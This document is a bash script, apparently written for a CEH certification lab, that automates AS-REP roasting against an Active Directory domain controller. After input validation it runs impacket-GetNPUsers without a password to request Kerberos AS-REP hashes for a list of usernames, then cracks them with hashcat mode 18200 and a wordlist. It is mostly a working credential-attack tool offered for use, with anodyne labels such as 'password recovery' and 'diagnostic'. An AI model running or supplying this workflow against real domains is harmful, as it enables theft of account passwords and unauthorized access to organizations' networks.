#!/bin/bash

# =============================================================================
# Automated Domain Controller Password Recovery Workflow
# CEH Lab Environment
#use only as-rep roasting attacks:)
# =============================================================================

# Enable strict mode for better error handling
set -euo pipefail

# Define clear argument order
USERNAME_FILE="${1:-}"
WORDLIST="${2:-}"
TARGET_IP="${3:-}"
DOMAIN="${4:-}"
RESULTS_DIR="${5:-}"

# Argument Validation
echo "========================================"
echo "ARGUMENT VALIDATION"
echo "========================================"

if [[ -z "$USERNAME_FILE" || -z "$WORDLIST" || -z "$TARGET_IP" || -z "$DOMAIN" || -z "$RESULTS_DIR" ]]; then
  echo "Usage: $0 <username_file> <wordlist> <target_ip> <domain> <results_dir>"
  exit 1
fi

# Check required files exist and are readable
if [[ ! -f "$USERNAME_FILE" ]]; then
  echo "Error: Username input must be a regular file."
  exit 1
fi

if [[ ! -r "$USERNAME_FILE" ]]; then
  echo "Error: Username file is missing or unreadable."
  exit 1
fi

if [[ ! -f "$WORDLIST" ]]; then
  echo "Error: Wordlist input must be a regular file."
  exit 1
fi

if [[ ! -r "$WORDLIST" ]]; then
  echo "Error: Wordlist file is missing or unreadable."
  exit 1
fi

# Validate Target IP format (IPv4)
if [[ ! "$TARGET_IP" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
  echo "Error: Target must be an IPv4 address."
  exit 1
fi

# Validate Domain format (alphanumeric + dots/hyphens)
if [[ ! "$DOMAIN" =~ ^[[:alnum:]_.-]+$ ]]; then
  echo "Error: Domain contains unexpected characters."
  exit 1
fi

# Check if Results directory exists or create it
if [[ -e "$RESULTS_DIR" && ! -d "$RESULTS_DIR" ]]; then
  echo "Error: Results path exists but is not a directory."
  exit 1
fi

mkdir -p -- "$RESULTS_DIR"

echo "[SUCCESS] System setup completed."

# Define output file paths
IMPAKET_OUTPUT_LOG="$RESULTS_DIR/impacket_output.log"
OUTPUT_FILE="$RESULTS_DIR/asrep_output.txt"
HASH_INPUT_FILE="$RESULTS_DIR/hash_input.txt"
HASHCAT_LOG="$RESULTS_DIR/hashcat.log"
RECOVERED_RESULTS_FILE="$RESULTS_DIR/recovered_results.txt"
DIAGNOSTIC_LOG="$RESULTS_DIR/system_check.log"

echo "========================================"
echo "DEFINED VARIABLES AND OUTPUT PATHS"
echo "========================================"
echo " Username file: $USERNAME_FILE"
echo " Wordlist: $WORDLIST"
echo " Target IP: $TARGET_IP"
echo " Domain: $DOMAIN"
echo " Results dir: $RESULTS_DIR"
echo ""

# Function to run logged commands safely
run_logged() {
  local log_file="$1"
  shift

  echo "[INFO] Running: $@"

  if "$@" > "$log_file" 2>&1; then
    echo "[SUCCESS] Command completed."
    return 0
  else
    local status=$?
    echo "[ERROR] Command failed with exit code $status."
    echo "[ERROR] Check log: $log_file"
    return "$status"
  fi
}

echo "========================================"
echo "EXECUTING IMPACKET WORKFLOW"
echo "========================================"


# Validate output paths before executing a command
if [[ -z "${OUTPUT_FILE:-}" ]]; then
  echo "[ERROR] OUTPUT_FILE is not defined."
  exit 1
fi

if [[ ! -d "$(dirname -- "$OUTPUT_FILE")" ]]; then
  echo "[ERROR] Output directory does not exist."
  exit 1
fi

if [[ ! -r "$USERNAME_FILE" || ! -r "$WORDLIST" ]]; then
  echo "[ERROR] An input file is missing or unreadable."
  exit 1
fi

echo "[INFO] Output path and input files validated."


if run_logged "$IMPAKET_OUTPUT_LOG" impacket-GetNPUsers \
  "$DOMAIN/" \
  -dc-ip "$TARGET_IP" \
  -usersfile "$USERNAME_FILE" \
  -no-pass \
  -request \
  -format john \
  -outputfile "$OUTPUT_FILE"
  then
 echo "[SUCCESS] Diagnostic completed."
else
  status=$?
  echo "[ERROR] Command failed with exit status $status."
  exit "$status"
fi  


echo "========================================"
echo "OUTPUT FILE CHECK"
echo "========================================"

if [[ -s "$OUTPUT_FILE" ]]; then
    echo "[INFO] Output file exists and is nonempty: $OUTPUT_FILE"
    echo "[INFO] Review its contents with: less \"$OUTPUT_FILE\""
    hashcat -m 18200 -a 0 "$OUTPUT_FILE" "$WORDLIST"
else
    echo "[WARNING] Output file is missing or empty."
fi